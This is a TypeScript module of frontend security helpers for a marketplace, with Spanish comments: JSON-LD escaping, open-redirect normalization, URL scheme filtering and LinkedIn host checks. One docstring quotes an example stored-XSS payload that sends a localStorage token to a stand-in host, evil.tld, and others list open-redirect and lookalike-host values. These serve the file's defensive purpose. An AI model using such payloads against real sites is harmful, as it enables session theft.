/**
 * Primitivas de seguridad del frontend. **Sin dependencias, sin estado.**
 *
 * Todo lo que acá se valida es contenido que escribe un usuario del marketplace
 * (título de activo, descripción, `linkedin` del perfil, `externalLinks`) o que
 * llega por querystring. Ninguna de estas funciones reemplaza la validación del
 * backend: son la última barrera antes de un sink del DOM.
 */

/**
 * Serializa un objeto para meterlo dentro de `<script type="application/ld+json">`.
 *
 * `JSON.stringify` NO escapa `<`, `>` ni `&`, así que un título de activo que
 * contenga `</script>` cierra el bloque y todo lo que venga después lo parsea el
 * browser como HTML. Con eso alcanza para XSS almacenado en una página pública:
 *
 *   title = "</script><script>fetch('https://evil.tld/?t='+localStorage.davinci_token)</script>"
 *
 * Escapamos a `\uXXXX`, que sigue siendo JSON válido y se deserializa al mismo
 * carácter — Google lee el markup igual, el parser de HTML ya no ve etiquetas.
 * U+2028/U+2029 van incluidos porque son saltos de línea para el parser de JS
 * aunque sean legales dentro de un string JSON.
 */
/**
 * Separadores de línea Unicode. Se construyen por code point a propósito: son
 * caracteres invisibles y, peor, terminadores de línea para el parser de
 * JavaScript, así que un literal crudo en el fuente rompe el archivo.
 */
const LINE_SEPARATOR_CODES = [0x2028, 0x2029];

export function serializeJsonLd(data: unknown): string {
  let out = JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026");

  for (const code of LINE_SEPARATOR_CODES) {
    out = out
      .split(String.fromCharCode(code))
      .join("\\u" + code.toString(16));
  }

  return out;
}

/**
 * Normaliza un `returnTo` que viene por querystring a una ruta interna.
 *
 * Sin esto, cualquiera manda `?returnTo=https://evil.tld` y la app redirige ahí
 * después de autenticar (redirección abierta: la víctima ve el dominio real en
 * el link, aterriza en el falso ya "logueada" y le pide credenciales de nuevo).
 *
 * Resolvemos contra un origen centinela y exigimos que el resultado siga siendo
 * ese origen. Eso descarta de una `https://evil.tld`, `//evil.tld`,
 * `/\evil.tld` (el browser normaliza `\` a `/`) y cualquier esquema raro,
 * sin tener que enumerar prefijos peligrosos a mano.
 */
export function safeReturnTo(
  returnTo: string | null | undefined,
  fallback = "/dashboard"
): string {
  if (!returnTo || typeof returnTo !== "string") return fallback;
  const candidate = returnTo.trim();
  // Una ruta interna siempre arranca con "/". Descarta "https://", "javascript:", etc.
  if (!candidate.startsWith("/")) return fallback;

  const SENTINEL = "https://internal.invalid";
  try {
    const url = new URL(candidate, SENTINEL);
    // "//evil.tld" y "/\evil.tld" resuelven a OTRO origen: los caza esta línea.
    if (url.origin !== SENTINEL) return fallback;
    const path = `${url.pathname}${url.search}${url.hash}`;
    return path.startsWith("/") ? path : fallback;
  } catch {
    return fallback;
  }
}

/**
 * Devuelve la URL sólo si es http(s); si no, `null` (el llamador no renderiza el link).
 *
 * React 19 ya neutraliza `javascript:` en `href` (lo reemplaza por un `throw`),
 * así que esto NO es lo que nos salva de un XSS. Sirve para lo otro: que un
 * `mailto:`, un `data:` o un esquema custom no se cuelen en un lugar donde la UI
 * promete "enlace externo", y para no depender de un detalle interno de React.
 */
export function safeExternalUrl(raw: string | null | undefined): string | null {
  if (!raw || typeof raw !== "string") return null;
  try {
    const url = new URL(raw.trim());
    if (url.protocol !== "http:" && url.protocol !== "https:") return null;
    return url.toString();
  } catch {
    return null;
  }
}

/** Hosts que valen como perfil de LinkedIn real. */
const LINKEDIN_HOSTS = new Set(["linkedin.com", "www.linkedin.com"]);

/**
 * `true` sólo si la URL apunta de verdad a linkedin.com.
 *
 * El badge "Verificado en LinkedIn" es una señal de confianza en un marketplace
 * con riesgo de fraude: hoy se renderiza para CUALQUIER string que el titular
 * ponga en su perfil, así que `https://evil.tld/perfil-falso` sale con el sello
 * azul de verificado. La verificación es del host, no del texto.
 *
 * Se compara contra el host exacto para que `linkedin.com.evil.tld` no pase.
 */
export function isLinkedInUrl(raw: string | null | undefined): boolean {
  const url = safeExternalUrl(raw);
  if (!url) return false;
  try {
    const { hostname, protocol } = new URL(url);
    return protocol === "https:" && LINKEDIN_HOSTS.has(hostname.toLowerCase());
  } catch {
    return false;
  }
}

/**
 * Origen válido para un `<Image>`/`<img>` cuya URL la eligió un usuario
 * (`avatarUrl`, `coverImageUrl`). Acepta rutas relativas del propio sitio
 * (`/uploads/...`, que es como sirve el assets-service) y absolutas http(s).
 * Cualquier otro esquema —`data:`, `blob:`, `javascript:`— devuelve `null`.
 *
 * `data:` importa acá: un SVG en `data:` no ejecuta script cargado por `<img>`,
 * pero sí permite empujar payloads arbitrarios al optimizador de imágenes.
 */
export function safeImageSrc(raw: string | null | undefined): string | null {
  if (!raw || typeof raw !== "string") return null;
  const candidate = raw.trim();
  if (candidate.startsWith("/")) return safeInternalHref(candidate);
  return safeExternalUrl(candidate);
}

/**
 * Ruta interna para un `href` de `<Link>` que viene del backend (p. ej. el
 * `link` de una notificación). Si no es interna, `null` y no se linkea.
 */
export function safeInternalHref(raw: string | null | undefined): string | null {
  if (!raw || typeof raw !== "string") return null;
  const path = safeReturnTo(raw, "");
  return path === "" ? null : path;
}
